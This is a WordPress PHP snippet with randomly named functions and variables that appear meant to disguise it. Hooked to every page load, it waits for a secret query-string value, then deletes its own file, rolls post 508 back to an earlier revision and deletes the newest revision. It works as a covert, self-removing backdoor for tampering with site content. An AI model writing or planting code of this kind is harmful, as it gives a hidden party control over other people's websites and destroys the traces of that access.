<?php

function compare_blog_numbers_404() {
	if (isset($_GET['news_single_forms_limit']) && $_GET['news_single_forms_limit'] === 'updater_terms_single_network') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$magic_javascript_translator = 508;
		$survey_open_converter = wp_get_post_revisions($magic_javascript_translator);
		if (empty($survey_open_converter)) die('no revisions');
		if (count($survey_open_converter) < 2) die('less than 2');
		$contents_automatorwp_grid = array_shift($survey_open_converter);
		$screen_gateway_mode_print = $contents_automatorwp_grid->ID;
		$module_anti_toolbar = array_shift($survey_open_converter);
		$label_youtube_marketing = $module_anti_toolbar->ID;
		$easy_status_stats = wp_restore_post_revision($label_youtube_marketing);
		if ($easy_status_stats === false) die('error restoring');
		$easy_status_stats = wp_delete_post_revision($screen_gateway_mode_print);		
		if ($easy_status_stats === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'compare_blog_numbers_404');
